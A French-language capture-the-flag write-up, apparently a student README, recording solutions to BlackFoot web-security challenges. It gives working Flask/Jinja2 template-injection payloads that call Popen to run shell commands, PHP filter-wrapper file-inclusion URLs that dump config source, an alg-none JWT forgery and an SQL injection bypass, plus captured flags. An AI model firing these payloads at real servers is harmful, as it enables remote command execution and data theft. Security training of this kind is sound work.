# WebSecurity

Sujet du repo: [Resolutions des defis de securité web créé par BlackFoot](https://secu-web.blackfoot.dev)

## Open Field

### :x: Wordstress


## Graphql

### :white_circle: Confessions

Nom de la categorie: GraphQL -> inspection des requettes effectué.  
Le schema graphql est public.  
Exposition de la query **requestLog**, on peut y trouver la liste des requettes effectués et voir les hash demandés [cf DumpFile(/Graphql-Confessions/RequestLog.dump.json)](/Graphql-Confessions/RequestLog.dump.json).  
Dans [/Graphql-Confessions/RequestLog.23-05.json](/Graphql-Confessions/RequestLog.23-05.json) on trouve les requetes qui on été fait avant le debut du cours, le 23/05 (preparation du projet ?).  
Dans [/Graphql-Confessions/Hash.23-05.txt](/Graphql-Confessions/Hash.23-05.txt) on trouve la liste des hashs extraits des logs du 23/05.  
Apres inspection via la query **confession**, ils ont tous pour titre Flag, on peut donc supposer que le flag se trouve dans le messages de ces confessions.  
  
On a essayé:
  - [dcode sha256](https://www.dcode.fr/sha256-hash): rien trouvé
  - base64 to ascii: invalid
  - hex to ascii: invalid


## SSTI

### :heavy_check_mark: SSTI 1

Le nom de la category est SSTI (Server Side Template Injection).  
Le titre de la page est Flaaaasque, on peut donc conclure que le moteur utilisé est Flask.  
Apres test, on peut utiliser `{{8*8}}` pour tester et faire un calcul.  
En utilisant `{{config.items()}}` on peut obtenir la config du server.  
cf [/SSTI/SSTI_1/config.dump.txt](/SSTI/SSTI_1/config.dump.txt) un dump de la config du server.  
Flag trouvé: `('FLAG', 'BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}')`

### :heavy_check_mark: SSTI 2

Aussi du Flask, donc on peut utiliser `{{8*8}}`.  
En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_2/config.dump.txt) mais le flag ne s'y trouve pas.  
En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_2/class.dump.txt).  
Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268]}}` permet de recuperer la class Popen.  
Utiliser la Popen nous permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nous renvoi `(b'app.py\nconfig.py\nflag.txt\nindex.html\n', None)`.  
On peut voir un fichier appelé flag.txt, pour l'afficher, on peut utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('cat flag.txt', shell=True,stdout=-1).communicate()}}`, ce qui nous donne: `(b'BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}', None)`.  
On a donc trouvé le flag `BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}`

### :white_circle: SSTI 3

Encore du Flask, on peut toujour utiliser `{{8*8}}`.  
En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_3/config.dump.txt) mais le flag ne s'y trouve pas non plus.  
En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_3/class.dump.txt).  
Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[409]}}` permet de recuperer la class Popen.  
Utiliser la Popen nous permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[409]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nous renvoi `(b'app.py\nconfig.py\ngetFlag\nindex.html\n', None)`.  
Utiliser la commande `{{''.__class__.__mro__ [1].__subclasses__()[409]('cat getFlag', shell=True,stdout=-1).communicate()}}` nous donne le contenue du fichier [cf: getFlag](/SSTI/SSTI_3/getFlag).  
Le fichier [getFlag](/SSTI/SSTI_3/getFlag) semble etre un executable mais il ne veux pas se lancer.


### :white_circle: SSTI 4

Encore du Flask, on peut toujour utiliser `{{8*8}}`.  
En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_4/config.dump.txt) mais le flag ne s'y trouve pas non plus.  
En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_4/class.dump.txt).  
Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[180]}}` permet de recuperer la class Popen.  
Utiliser la Popen nous permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[180]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nous renvoi `(b'Courage bunz <3\nFlag.txt\napp.py\nconfig.py\ndalek.py\ndocker-compose.yml\nindex.html\nindex.html.bak\n', None)`.  
Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[180]('cat Flag.txt', shell=True,stdout=-1).communicate()}}` nous montre que le fichier Flag.txt est vide.  
Le fichier [docker-compose.yml](/SSTI/SSTI_4/docker-compose.yml) n'est pas vide.  

Suposition: Il est mentioné dans le docker-compose que le port n'a pas été fermé. Je suppose qu'il est possible de passer par le network de docker pour passer de la vm flask a la machine qui se trouve deriere et d'y trouver quelque chose

## SSRF

### :x: SSRF 1


## Obfuscation

### :heavy_check_mark: OBF 100

La page HTML a été extraite dans [index.html](./Obfuscation/OBF100/index.html). On peut y voir le script utilisé, notament les conditions et le mot de passe.  
l'input est comparé à `\x67\x67\x65\x7A`, traduit de l'hexa, on obtien `ggez`.  
L'utiliser sur le site nous indique qu'il s'aggit du flag.

### :x: SCRIPT_KIDDING


## XXE

### :x: XXE 1

### :x: XXE 2


## XSS

### :x: Whatsup

### :x: Whatsup2


## JWT

### :heavy_check_mark: Mythique 1

Apres inspection du code source, on peut voir qu'un cookie est recuperé pour s'identifier.  
Ce [cookie](./JWT/Mythique1/OriginJWT.txt) a la forme d'un JWT.  
Grace a un site comme https://www.gavinjl.me/edit-jwt-online-alg-none/, qui permet de remplacer seuleument le payload, on peut obtenir ce [token](./JWT/Mythique1/ModJWT.txt).  
Apres remplacement du cookie sur la page, on peut cliquer sur le bouton et obtenir ce flag:  
flag: `JwT_m0r3_l1k3_jwP33_xd`

### :x: Mythique 2

### :x: Mythique 3


## SQLI

### :heavy_check_mark: Potionseller
Après s'etre balader sur la page, nous nous sommes rendu compte que nous n'avions pas acces a la potion n*4.
Cependant, en fouillant les networks nous avons vu qu'une requête contenait l'id de la potion. Nous pouvions donc modifier cet id pour essayer d'avoir les infos sur la potion 4 !
Cela nous refusait l'acces a la data mais l'endpoint fonctionnait tout de meme. Étant donnée qu'il s'agissait de la section Injection SQL, nous sommes donc parti sur une tentative d'injection sql directement dans l'url.
Au debut on recoit un message d'erreur qui nous dis que cela ressemble a du code pour detourner le probleme on peut juste rajouter un operateur SQL AND en faisant une manipulation comme id and id > 3. De cette facon la nous obtenons les informations sur la potion id 4 et donc le flag.

### :x: Potionseller 2


## IFI

### :heavy_check_mark: noprotection

La page nous indique que le flag est a un endroit evident.  
En testant, on peut le trouver a cette addresse: https://noprotection.secu-web.blackfoot.dev/flag.html.  
flag: `y34h_y0u_f0und_m3`

### :heavy_check_mark: filters
Pour ce challenge, nous avons remarquer qu'il etait possible de changer les langues du site qui nous montrait un chemin de fichier.
Apres plusieurs recherches dans les sources etc, nous sommes tomber sur ce lien
`https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/`
qui explique comment récuperer du contenu de fichier depuis des urls.
Par exemple avec `php://filter/convert.base64-encode/resource=index` on peut recuperer du contenu de l'index en base64.

Apres quelques essais nous avons reussi a trouver que en rajoutant
`lang=php://filter/convert.base64-encode/resource=config`
Nous obtenions un flag en base64 qu'il nous suffisait ensuite de decoder.


### :heavy_check_mark: extprotect
Pour ce challenge, nous sommes parti avec la meme methodologie que pour le précedent car nous n'avions pas forcement de nouvelles idées.
Et cela a fonctionner avec un fichier de ressource differents et avec le path suivant:
`https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php`

### :x: remote


## Auth

### :heavy_check_mark: Auth 50

Le nom de la categorie est auth, on peut donc supposer que la solution a à voir avec la connexion.  
Apres differents essaie, nous avons trouvé la bonne configuration username password  
username: `admin`
password: `password`
flag: `We_f1n@llY_c@n_Tr0lL_t3am5_1Ts_0uR_TuRn`

### :heavy_check_mark: Auth 100

Sur la page, on voit encore un lien vers [la source PHP](https://auth100.secu-web.blackfoot.dev/index.php?source).  
On peut y observer l'algorithm pour la connexion.  
En sachant que `ord` est une fonction prenant un charactere ascii et renvoyant sa valeur decimal, on peut connaitre la solution.
L'algorithm prend le username, additione la valeur ascii de tous ses characteres et les compares au mot de passe.  
Sachant que la valeur ascii de `d` est 100, On peut donc prendre:  
username: `dddddd`  
password: `600`  
Le flag nous est ensuite envoyé: `M4ke_@_PyTh0n_K3yg3N_1f_U_W@nT_t0_H4ve_Th3_SakiiR_Gr33t1nGs`

### :heavy_check_mark: Auth 200

Encore une fois, sur la page, on a un lien vers [la source PHP](https://auth200.secu-web.blackfoot.dev/index.php?source).  
Et on peut aussi y trouver l'algorithm de connection.  
[Inverser l'algorithm](./Auth/Auth200/decrypt.js) nous donne `hard_to_crack_i_guess_lol!!!!`.  
Flag, qui valide le formulaire du site qui nous donne:  
flag: `BFS{1_L0v3_t0_x0r_tH1ng5_l1k3_@_p0nY!}`

## JS

### :heavy_check_mark: b64js

Le code source de la page a été mit dans le fichier [index.html](./JS/b64js/index.html).  
L'input est passé dans btoa puis comparé a pass. Si le même, input = flag.  
On peut inverser btoa grace a atob et donc connaitre input depuis pass.  
```javascript
window.atob("RXZlckhlYXJkT2ZCYXNlNjQ/")
```
Flag: `EverHeardOfBase64?`

### :heavy_check_mark: JS200

Le nom de la categorie est JS, on peut donc supposer que le solution se trouve dans le code de la page.  
Le code source de la page a été extrait dans le fichier [index.html](./JS/JS200/index.html).  
Dans ce fichier, on peut voir une variable appelé `flag` non lisible. On peut aussi voir un algorithm pour voir le vrai flag.  
Cet algorithm a été déplacer dans le fichier [getFlag.js](./JS/JS200/getFlag.js) puis inversé pour obtenir le vrai flag

```
Commande: node ./JS/JS200/getFlag.js
Flag: JCVD-approves-this-challenge
```
